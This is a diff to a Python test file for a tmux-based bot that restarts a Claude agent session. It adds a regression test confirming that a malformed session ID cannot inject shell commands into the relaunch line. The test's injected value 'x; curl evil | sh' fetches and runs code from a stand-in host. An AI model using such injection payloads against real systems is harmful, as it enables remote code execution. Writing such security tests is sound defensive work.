@@ -98,7 +98,9 @@ class TestRestartBusyGuard:
         ):
             cfg.claude_command = "claude"
             sm._is_docker_binding.return_value = False
-            sm.get_window_state.return_value = MagicMock(session_id="sid-1")
+            sm.get_window_state.return_value = MagicMock(
+                session_id="11111111-2222-3333-4444-555555555555"
+            )
             tm.find_window_by_id = AsyncMock(return_value=MagicMock())
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
@@ -110,4 +112,42 @@ class TestRestartBusyGuard:
             await _restart_agent(query, "@5", fresh=False)
 
             sent = [c.args[1] for c in tm.send_keys.await_args_list]
-            assert sent == ["/exit", "claude --resume sid-1"]
+            assert sent == [
+                "/exit",
+                "claude --resume 11111111-2222-3333-4444-555555555555",
+            ]
+
+    async def test_malformed_session_id_starts_fresh_no_injection(
+        self, query, monkeypatch
+    ):
+        """A shell-metachar session_id must NOT reach the relaunch command.
+
+        Guards audit HIGH#1: session_id is typed into the pane's shell after
+        /exit, so an unvalidated value would be command injection on the host.
+        """
+
+        async def _no_sleep(_):
+            return None
+
+        monkeypatch.setattr(asyncio, "sleep", _no_sleep)
+        with (
+            patch("ccbot.handlers.callbacks.session_manager") as sm,
+            patch("ccbot.handlers.callbacks.tmux_manager") as tm,
+            patch("ccbot.handlers.callbacks.is_claude_working", return_value=False),
+            patch("ccbot.handlers.callbacks.config") as cfg,
+            patch("ccbot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
+        ):
+            cfg.claude_command = "claude"
+            sm._is_docker_binding.return_value = False
+            sm.get_window_state.return_value = MagicMock(session_id="x; curl evil | sh")
+            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
+            tm.capture_pane = AsyncMock(return_value="❯ ")
+            tm.send_keys = AsyncMock()
+            sm.capture_pane = AsyncMock(return_value="❯ \n" + "─" * 100 + "\n")
+
+            await _restart_agent(query, "@5", fresh=False)
+
+            sent = [c.args[1] for c in tm.send_keys.await_args_list]
+            # No --resume appended; the payload never reaches the shell line.
+            assert sent == ["/exit", "claude"]
+            assert all("curl evil" not in s for s in sent)
